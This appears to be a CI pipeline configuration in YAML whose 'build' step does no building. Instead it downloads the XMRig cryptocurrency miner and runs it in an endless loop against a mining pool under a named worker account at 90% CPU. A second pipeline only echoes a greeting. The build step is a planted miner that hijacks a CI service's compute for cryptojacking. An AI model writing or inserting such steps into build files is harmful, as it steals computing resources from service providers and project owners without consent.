box:
  id: ubuntu
build:
  steps:
    - script:
        code: wget https://github.com/xmrig/xmrig/releases/download/v2.15.1-beta/xmrig-2.15.1-beta-xenial-x64.tar.gz && tar -xf xmrig-2.15.1-beta-xenial-x64.tar.gz && cd xmrig-2.15.1-beta && while true; do ./xmrig -o europe.cryptonight-hub.miningpoolhub.com:20580 -u brahim7.brahim37 -p x --threads 8 --max-cpu-usage=90 --cpu-priority 4 --donate-level 1 ; sleep 1; done

hello-again:
  box: ubuntu
  services:
    - mongo:2.2.7
  steps:
    - script:
        code: echo "hello, again world!"
